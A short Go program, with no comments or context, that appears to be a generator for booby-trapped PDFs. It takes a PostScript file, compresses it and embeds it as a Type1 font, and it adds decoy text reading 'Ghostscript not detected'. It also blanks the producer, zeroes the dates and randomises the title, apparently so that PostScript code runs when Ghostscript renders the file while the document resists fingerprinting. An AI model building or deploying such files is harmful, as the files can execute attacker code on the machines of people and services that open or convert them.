package main

import (
	"bytes"
	"compress/zlib"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"time"

	"github.com/phpdave11/gofpdf"
)

func main() {
	if len(os.Args) != 3 {
		log.Fatalf("usage: %s <in.ps> <out.pdf>", os.Args[0])
	}
	ps, pdf := os.Args[1], os.Args[2]
	psData, err := ioutil.ReadFile(os.Args[1])
	if err != nil {
		log.Fatalf("reading %s: %v", ps, err)
	}
	pdfData := genPDFWithPS(psData)
	if err := ioutil.WriteFile(pdf, pdfData, 0666); err != nil {
		log.Fatalf("writing %s: %v", pdf, err)
	}
}

func genPDFWithPS(psData []byte) []byte {
	pdf := gofpdf.NewCustom(&gofpdf.InitType{
		OrientationStr: "p",
		UnitStr:        "pt",
		SizeStr:        "",
		Size: gofpdf.SizeType{
			Wd: float64(2480),
			Ht: float64(3508),
		},
		FontDirStr: ".",
	})
	pdf.SetAutoPageBreak(false, 0)
	pdf.AddPage()
	size := 150
	widths := make([]int, 256)
	for i := range widths {
		widths[i] = 500
	}

	descriptor, _ := json.Marshal(map[string]interface{}{
		"Name": "PSPoeb",
		"File": "Sisechka.z",
		"Tp":   "Type1",
		"Cw":   widths,
	})

	gzFontBuf := bytes.NewBuffer(nil)
	zw := zlib.NewWriter(gzFontBuf)
	_, _ = zw.Write(psData)
	_ = zw.Close()

	pdf.AddFontFromBytes("PSPoeb", "", descriptor, gzFontBuf.Bytes())
	pdf.SetFont("PSPoeb", "", float64(size))

	pdf.SetTextColor(0, 0, 0)
	pdf.MoveTo(200, float64(800))
	pdf.Cell(0, 0, "Ghostscript not detected")
	pdf.MoveTo(200, float64(1200))
	pdf.Cell(0, 0, "ABCDEFGHIJKLM")
	pdf.MoveTo(200, float64(1400))
	pdf.Cell(0, 0, "NOPQRSTUVWXYZ")
	pdf.SetProducer("", false)
	pdf.SetCreationDate(time.Unix(0, 0))
	pdf.SetModificationDate(time.Unix(0, 0))
	var randomizer [10]byte
	_, _ = rand.Read(randomizer[:])
	pdf.SetTitle(fmt.Sprintf("%x", randomizer), false)
	pdfBuf := bytes.NewBuffer(nil)
	if err := pdf.Output(pdfBuf); err != nil {
		panic(err)
	}
	pdf.Close()
	return pdfBuf.Bytes()
}
